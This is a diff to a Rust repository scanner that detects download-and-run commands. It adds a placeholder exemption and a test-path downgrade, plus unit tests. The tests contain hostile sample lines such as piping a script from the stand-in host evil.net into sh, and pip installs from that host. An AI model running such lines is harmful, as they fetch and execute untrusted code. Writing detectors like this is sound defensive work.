@@ -9,7 +9,7 @@
 use crate::git::RepoFile;
 use crate::network::{
     CALL, DECODE, FileClass, LineCounter, classify, host_of, is_binary, is_in_comment, is_local,
-    is_reserved_host, nearby_lines, surrounding_line,
+    is_reserved_host, is_test_path, nearby_lines, surrounding_line,
 };
 use crate::report::{At, Kind, Report};
 use crate::text::Untrusted;
@@ -165,6 +165,7 @@ fn compile(pattern: &str) -> Regex {
 /// few lines apart, as in `const res = await fetch(u); eval(await res.text())`.
 const NEARBY_LINES: usize = 12;
 const NEARBY_WINDOW_BYTES: usize = 1200;
+const ADDRESS_MARKERS: [&[u8]; 4] = [b"git+", b"github:", b"https://", b"http://"];
 const PACKAGE_MANAGERS: [&str; 7] = ["pip", "npm", "pnpm", "yarn", "bun", "gem", "pip3"];
 /// How close together downloading, saving and starting a program have to be.
 const SAVE_AND_RUN_LINES: usize = 8;
@@ -304,14 +305,21 @@ fn add_piped_downloads(file: &RepoFile, report: &mut Report) {
             || is_in_comment(contents, found.start(), file.path.raw())
             || (found.as_bytes().ends_with(b"://") && points_nowhere_real(after))
             || installs_from_nowhere_real(found.as_bytes())
+            || installs_a_placeholder(found.as_bytes())
         {
             continue;
         }
 
+        // Tests of how a tool handles package addresses are full of them.
+        let kind = if is_package_install(found.as_bytes()) && is_test_path(file.path.raw()) {
+            Kind::UnusualPackageSource
+        } else {
+            Kind::DownloadsAndRuns
+        };
         let snippet = snippet(contents, found.start(), found.end());
         let line = lines.line_at(found.start());
         report.add(
-            Kind::DownloadsAndRuns,
+            kind,
             "",
             snippet.raw(),
             Some(At {
@@ -343,16 +351,43 @@ fn points_nowhere_real(address: &[u8]) -> bool {
 
 /// `pnpm install x --registry http://localhost:4873/` uses this computer's own copy.
 fn installs_from_nowhere_real(found: &[u8]) -> bool {
-    let is_install = PACKAGE_MANAGERS.iter().any(|manager| {
-        found.len() > manager.len()
-            && found[..manager.len()].eq_ignore_ascii_case(manager.as_bytes())
-    });
     let address = found
         .windows(3)
         .rposition(|window| window == b"://")
         .map(|at| &found[at + 3..]);
 
-    is_install && address.is_some_and(points_nowhere_real)
+    is_package_install(found) && address.is_some_and(points_nowhere_real)
+}
+
+fn is_package_install(found: &[u8]) -> bool {
+    PACKAGE_MANAGERS.iter().any(|manager| {
+        found.len() > manager.len()
+            && found[..manager.len()].eq_ignore_ascii_case(manager.as_bytes())
+    })
+}
+
+/// `pip install git+...` in documentation, where the dots stand for an address and
+/// nothing could be installed from them. It has to be the only address there, so
+/// that `pip install https://evil.net/a git+...` can't pass for one.
+fn installs_a_placeholder(found: &[u8]) -> bool {
+    if !is_package_install(found) {
+        return false;
+    }
+    let start = found
+        .iter()
+        .rposition(u8::is_ascii_whitespace)
+        .map_or(0, |at| at + 1);
+    let (before, address) = found.split_at(start);
+    let has_marker =
+        |text: &[u8], marker: &[u8]| text.windows(marker.len()).any(|window| window == marker);
+    let another_address = ADDRESS_MARKERS
+        .iter()
+        .any(|marker| has_marker(before, marker));
+
+    !another_address
+        && ADDRESS_MARKERS.iter().any(|marker| {
+            address.starts_with(marker) && address[marker.len()..].starts_with(b"...")
+        })
 }
 
 /// `document.body` and the like aren't the answer to a web request.
@@ -908,6 +943,70 @@ mod tests {
 
             assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
         }
+    }
+
+    #[test]
+    fn a_placeholder_in_documentation_is_not_an_install() {
+        for line in [
+            "installed from a repository (``pip install git+...``)",
+            "pip install git+...",
+            "pip install https://...",
+            "npm install github:...",
+        ] {
+            let report = scan_text("a.py", line.as_bytes());
+
+            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
+        }
+    }
+
+    #[test]
+    fn a_placeholder_cannot_cover_for_a_real_address() {
+        for line in [
+            "pip install git+...evil.net",
+            "pip install x git+... https://evil.net/a",
+            "pip install https://evil.net/a git+...",
+            "pip install git+https://evil.net/...",
+            "os.system(f\"pip install git+{url}\")",
+        ] {
+            let report = scan_text("a.py", line.as_bytes());
+            let expected = usize::from(!line.ends_with("git+...evil.net"));
+
+            assert_eq!(
+                report.listed(Kind::DownloadsAndRuns).len(),
+                expected,
+                "{line}"
+            );
+        }
+    }
+
+    #[test]
+    fn package_addresses_in_tests_are_only_a_warning() {
+        let line = "upgrade = f\"pip install -U 'a @ git+{URL}@main'\"";
+
+        for (path, danger, warning) in [
+            ("tests/common/test_updates.py", 0, 1),
+            ("src/updates.py", 1, 0),
+        ] {
+            let report = scan_text(path, line.as_bytes());
+
+            assert_eq!(
+                report.listed(Kind::DownloadsAndRuns).len(),
+                danger,
+                "{path}"
+            );
+            assert_eq!(
+                report.listed(Kind::UnusualPackageSource).len(),
+                warning,
+                "{path}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_shell_running_a_download_in_a_test_is_still_a_danger() {
+        let report = scan_text("tests/a.sh", b"curl https://evil.net/i.sh | sh\n");
+
+        assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1);
     }
 
     #[test]
